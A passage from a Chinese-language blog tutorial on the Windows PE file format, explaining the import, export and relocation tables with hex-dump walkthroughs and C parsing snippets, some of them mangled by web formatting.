class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">//节区下限</span></div><div class="line"><span class="function">DWORD lower = pSectionHeader[i].VirtualAddress;</span></div><div class="line"><span class="function">//节区上线</span></div><div class="line"><span class="function">DWORD maxer = pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize；</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &gt;= lower &amp;&amp; ImageAddr &lt;= maxer)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">return pSectionHeader[i].PointerToRawData + <span class="params">(ImageAddr - pSectionHeader[i].VirtualAddress)</span>;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">``` </span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这时候，我们需要用到新的知识IMAGE_IMPORT_DIRECTORY结构。简称IID。**IID结构对应着一个被隐式链接的DLL**，每个IID的结束标志为NULL。关于IID结构：</span></div></pre></td></tr></table></figure></li></ul><p>typedef struct _IMAGE_IMPORT_DESCRIPTOR {<br>    union {<br>        DWORD Characteristics;<br>        DWORD OriginalFirstThunk;            //INT(RBA)<br>    };<br>    DWORD TimeDateStamp;                    //时间戳<br>    DWORD ForwarderChain;<br>    DWORD Name;                                //DllName(RVA)<br>    DWORD FirstThunk;                        //IAT(RVA)<br>} IMAGE_IMPORT_DESCRIPTOR;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;需要我们关心的成员有三个：</div><div class="line"></div><div class="line">* OriginalFirstThunk：一个指向导入名称表(INT)**首地址**的RVA.</div><div class="line">* Name:一个指向隐式映射的dll的名称的RVA</div><div class="line">* FirstThunk:一个指向导入地址表(IAT)**首地址**的RVA</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;OriginalFirstThunk和FirstThunk都是指向一个名为IMAGE_THUNK_DATA的结构体，其中被OriginalFirstThunk指向的是导入名称表(INT)，被FirstThunk指向的是导入地址表(IAT)。而INT和IAT同时都指向一个新的结构IAMGE_IMPORT_BY_NAME。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82e31570e7.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，依照IMAGE_IMPORT_DESCRIPTOR来解析上面我们在文件中获取的IID数据如下。但是这些都是小端序显示的，首先需要转化为大端序，然后在使用上面讲的方法将其转化为文件偏移。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81c4e40fa0.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81df448b5c.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先查看<span class="number">774</span>和<span class="number">7</span>B4对应的DLL名称。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81e9677ba3.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后再来查看一下OriginalFirstThunk对应的INT数据，在此之前，我们需要了解一下IMAGE_THUNK_DATA这个数据结构。但是u1是一个共用体，怎么判断IAT中的IMAGE_THUNK_DATA中存储的是Ordinal，还是AddressOfData？**当IMAGE_THUNK_DATA最高位为<span class="number">1</span>的时候，表示序号导入，否则为字符导入，此时保存的是AddressOfData，一个指向IMAGE_IMPORT_BY_NAM的RVA**。一个IMAGE_THUNK_DATA对应一个函数(_IMAGE_IMPORT_BY_NAME)。</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_THUNK_DATA<br>{<br>    union<br>    {<br>         PBYTE ForwarderString;<br>         PDWORD Function;     //被导入的函数的入口地址<br>         DWORD Ordinal;       // 该函数的序数<br>         PIMAGE_IMPORT_BY_NAME AddressOfData;   // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME<br>     }u1;<br>} IMAGE_THUNK_DATA32;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在上面，我们了解了IMAGE_THUNK_DAT结构，而且知道了OriginalFirstThunk指向的是IMAGE_THUNK_DAT(INT)。所以，在文件偏移<span class="number">68</span>Ch处，找到数据<span class="number">10210000</span>，同样的，我们将它转化端序和文件偏移得到<span class="number">10210000</span>---&gt;<span class="number">2110</span>---&gt;<span class="number">710</span>。在<span class="number">710</span>处，我们应该可以得到IMAGE_IMPORT_BY_NAME这个结构体。现在，我们需要了解一下这个结构体的形式.</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_IMPORT_BY_NAME {<br>     WORD    Hint;       //函数需序号<br>     BYTE    Name[1];    //函数名称<br> } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;了解完IMAGE_IMPORT_BY_NAME这个结构体，在文件<span class="number">710</span>H处查看IMAGE_IMPORT_BY_NAME</div><div class="line">     ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb8264224925.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于IID是一个双桥结构，刚刚我们通过OriginalFirstThunk间接通过IAT寻找到了IMAGE_IMPORT_BY_NAME。接下来使用FirstThunk寻找IMAGE_IMPORT_BY_NAME。可以发现两处都是指向同一个地址，而且这个地址就是IMAGE_IMPORT_BY_NAME</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82826e90dc.png)</span></div><div class="line"></div><div class="line"><span class="meta">## 0x1.3 导入表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;编程实现文件中导入表获取，首先利用ReadFile函数将对象PE文件读入内存,这里可以使用多种方法读取。</div></pre></td></tr></table></figure></p><p>if (!ReadFile(hFile, lpBaseAddress, dwFileSize, &amp;dwNumberOfBytesRead, NULL))<br>{<br>    printf(“ReadFile:%d\n”, GetLastError());<br>    return FALSE;<br>}<br>PrintImportTable(lpBaseAddress);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后在数据目录第二项获取导入表的RVA。但是需要注意的是，必须加上文件在内存中的基地址，这样才是IID的地址。</div></pre></td></tr></table></figure></p><p>//获取导入表地址<br>DWORD Rav_Import_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>PIMAGE_IMPORT_DESCRIPTOR ImportTable = PIMAGE_IMPORT_DESCRIPTOR((ULONG_PTR)lpBaseAddress + Rav_Import_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来是遍历IMAGE_IMPORT_DESCRIPTOR，因为IMAGE_IMPORT_DESCRIPTOR个数是和隐式链接的dll数一致的，但是，IID结束的标志为全<span class="number">0</span>。所以只需要比较从第一个IID开始，如果有sizeof(IMAGE_IMPORT_DESCRIPTOR)个<span class="number">0</span>的话，说明IID遍历结束</div></pre></td></tr></table></figure></p><p>for (i = 0; memcmp(ImportTable + i, &amp;null_iid, sizeof(null_iid)); i++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;打印DLLNAME，利用IMAGE_IMPORT_DIRECTORY-&gt;Name打印DllName。同上，需要加上基地址</div></pre></td></tr></table></figure></p><p>DllName = (LPCSTR)((ULONG_PTR)lpBaseAddress + ImportTable-&gt;Name);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取OriginalFirstThunk。和IID一样的原理遍历INT。</div></pre></td></tr></table></figure></p><p>PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + ImportTable[i].OriginalFirstThunk);<br>//遍历同一个IID下的OriginalFirstThunk<br>for (j = 0; memcmp(pThunk + j, &amp;null_thunk, sizeof(PIMAGE_THUNK_DATA)); j++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;之前说过根据OriginalFirstThunk高位是否为<span class="number">1</span>判断导入方式，如果高位为<span class="number">1</span>,使用序号的方式导入，否则按照函数名称导入</div></pre></td></tr></table></figure></p><p>if (pThunk[j].u1.AddressOfData&amp;IMAGE_ORDINAL_FLAG)   //按标号导入<br>{<br>    //<br>}<br>else   //按名称导入<br>{<br>    //<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta"># 0x2 导出表</span></div><div class="line"><span class="meta">## 0x2.1 导出表的作用</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;我们都知道DLL是实现代码复用的重要方式，同时为了让调用DLL的PE文件(包括exe和dll)知道哪些函数是可以被复用的，所以dll会将可以被导出的函数的RVA值保存在导出表中。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表事实上并不只是存在于DLL中，同时也可能存在于exe中。当一个PE文件被装载的时候，装载器会将PE文件中所有被登记的DLL一起载入，然后根据DLL的导出表对导入表中的IAT进行修正。</div><div class="line"></div><div class="line"><span class="meta">## 0x2.2 导出表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表描述信息位于可选头的数据目录中的第一项。<span class="number">4000</span>是导出表的RVA值，需要转化为FOA值。利用导入表的公式`section[i].PointOfRawData+(RVA-VirtuallAddress)`进行计算，得到FOA为C00.</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd8cd14763.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd9b42b0b9.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候，我们在文件中的C00处就可以找到我们导出目录了。我们现在需要了解一下导出目录`IMPORT_EXPORT_DIRECTORY`这个结构.其中我们需要重点关心的成员有以下几个。</div><div class="line"></div><div class="line">* Name:导出函数的文件名RVA</div><div class="line">* Base:导出函数起始需要，在导出函数序号表中的值，需要加上此值才是导出函数真正的序号</div><div class="line">* NumberOfFunctions：导出函数个数</div><div class="line">* NumberOfNames：名称导出函数个数</div><div class="line">* AddressOfFunctions;        <span class="comment">//指向到处函数地址表的RVA</span></div><div class="line">* AddressOfNames;            <span class="comment">//指向函数名地址表的AVA</span></div><div class="line">* AddressOfNameOrdinals;     <span class="comment">//指向函数名序号表的RVA</span></div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_EXPORT_DIRECTORY {<br>    DWORD Characteristics;<br>    DWORD TimeDateStamp;            //输出表的创建时间<br>    WORD MajorVersion;                      //输出表的主版本号。未使用设置为0<br>    WORD MinorVersion;                      //输出表的次版本号。未使用设置为0<br>    DWORD Name;                //指向一个与输出函数关联的文件名的RVA<br>    DWORD Base;                //导出函数的起始序号<br>    DWORD NumberOfFunctions;        //导出函数的总数<br>    DWORD NumberOfNames;            //以名称导出的函数总数<br>    DWORD AddressOfFunctions;        //指向到处函数地址表的RVA<br>    DWORD AddressOfNames;            //指向函数名地址表的AVA<br>    DWORD AddressOfNameOrdinals;            //指向函数名序号表的RVA<br>} IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下图是导出表的数据。可以看到`<span class="number">32</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>`对应的是Name这个成员变量的RVA，我们调整端序，计算FOA(<span class="number">32400000</span>---&gt;<span class="number">00004032</span>---&gt;C32)可到Name在文件中的位置是C32.正好指向DllDemo.dll这个字符串。根据上述方法解析导出表数据如下</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbdd659be05.png)</span></div><div class="line"></div><div class="line">* Name：[C06]=C32--&gt;<span class="string">"DllDemo.dll"</span>  (rva)</div><div class="line">* Base：[C10]=<span class="string">"00000001"</span></div><div class="line">* NumberOfFunctions:[C14]=<span class="string">"00000001"</span></div><div class="line">* NumberOfNames:[C18]=<span class="string">"00000001"</span></div><div class="line">* AddressOfFunctions:[C1C]=C28---&gt;<span class="number">08100000</span> (RVA)</div><div class="line">* AddressOfNames:[C20]=C2C---&gt;<span class="string">"MsgBox"</span>     (RVA)</div><div class="line">* AddressOfNameOrdinals[C24]=C30---&gt;<span class="number">0000</span>   (RVA) </div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;【重点】PE装载器调用GetProcAddress来填充IAT，这时候需要了解GetProcAddress原理。</div><div class="line"></div><div class="line">* 定位到IMAGE_EXPORT_DIRECTORY结构</div><div class="line">* 判断Name是否是传入的DllName</div><div class="line">* 获取ENT数组的起始地址，寻找FuncName，如果找到记录在ENT的数组索引。</div><div class="line">* 然后读取导出函数序号数据的第一项的序号值</div><div class="line">* 使用Base+序号的值到EAT中寻找地址</div><div class="line"></div><div class="line"><span class="meta">## 0x2.3 导出表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先需要在数据目录中获取导出表地址，需要注意的是这个地址是个RVA的值，需要加上BaseAddress。</div></pre></td></tr></table></figure></p><p>DWORD Rav_Export_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpBaseAddress + Rav_Export_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于`AddressOfNames`,`AddressOfFunctions`,和`AddressOfNameOrdinals`都是RVA值，且都需要进程RVA-&gt;FOA的转化。所以如果要获取这三个成员变量的FOA的话需要进行两部，第一将RVA转化为FOA，然后加上BaseAddress。</div></pre></td></tr></table></figure></p><p>//获取导出函数名数组<br>DWORD<em> dwAddressOfNames =(DWORD</em>)((ULONG_PTR)lpBaseAddress+ RvaToOffset(ExportTable-&gt;AddressOfNames,lpBaseAddress));<br>//获取导出函数数组<br>DWORD<em> dwAddressOfFunctions = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfFunctions, lpBaseAddress));<br>//获取导出函数索引数组<br>DWORD<em> dwAddressOfNameOrdinals = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfNameOrdinals, lpBaseAddress));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;因为NumberOfFunctions&gt;=NumberOfNames,适合放在外部循环进行比较。</div></pre></td></tr></table></figure></p><p>for (i = 0; i &lt; dwNumberOfFunctions; i++){…}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在提到关于GetProcAddress用法时说道，如果目标函数在AddressOfFuns被找到记录其数组索引。然后在导出函数序号数组中寻找对应序号。</div></pre></td></tr></table></figure></p><p>if (<em>(WORD</em>)(dwAddressOfNameOrdinals + j * sizeof(WORD)) == i)<br>{}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接着取出我们的需要序号，以及在导出函数地址数组对应的序号所对应的导出函数地址</div></pre></td></tr></table></figure></p><p>//函数名称<br>FunName = (LPCSTR)((ULONG_PTR)lpBaseAddress + dwAddressOfNames[j <em> sizeof(WORD)]);  //VA值<br>//函数索引<br>FunOrdinal = </em>(WORD<em>)(dwAddressOfNameOrdinals + j </em> sizeof(WORD));<br>//函数地址   i=(dwAddressOfNameOrdinals + j <em> sizeof(WORD))   其实是索引值<br>//这里需要取其值，注意</em>(DWORD<em>)<br>FunAddress = </em>(DWORD<em>)(dwAddressOfFunctions + FunOrdinal </em> sizeof(DWORD));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbed6a89dd0.png)</span></div><div class="line"></div><div class="line"><span class="meta"># 0x3 重定位表</span></div><div class="line"><span class="meta">## 0x3.1 重定位原理</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;PE装载的时候，大多选用相对地址RVA，这样做的原因有二，第一是为了方便装载器，二是为了重定位。那么什么时候需要重定位呢，或者说重定位的条件是什么呢，我们应该知道每个进程内存是相互独立的，也就是说exe文件发生重定位的可能性不高，这样看来由于DLL的装载位置的不同，DLL文件发生重定位的可能性就比较高了，因为同一个进程空间里面可能存在多个DLL文件，有时候多个dll设定的原始的基地址是相同的，但是对于操作系统来说这是不允许存在的，所以需要对他们进行重定位。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候就需要将那些需要被重定位的数据保存在一张表里面，然后取出里面的地址，利用某一个特定的公式，重新计算加载地址即可。</div><div class="line"></div><div class="line"><span class="meta">## 0x3.2 重定位表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;重定位表位于数据目录项中第<span class="number">6</span>项，通过上述的方法可以定位到文件中重定位表地址为<span class="number">0xE00</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbf1da6e887.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbc0fe5b5fcd.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，我们开始解析重定位表，在解析之前，需要了解重定位表结构。重定位表是由多个IMAGE_BASE_RELOCATION结构体构成的。有三个成员变量</div></pre></td></tr></table></figure></p><p>typedef struct _IMAGE_BASE_RELOCATION {<br>    DWORD   VirtualAddress;//RVA<br>    DWORD   SizeOfBlock;   //重定位数据大小<br>    WORD    TypeOffset;    // 重定位项数组<br>} IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* 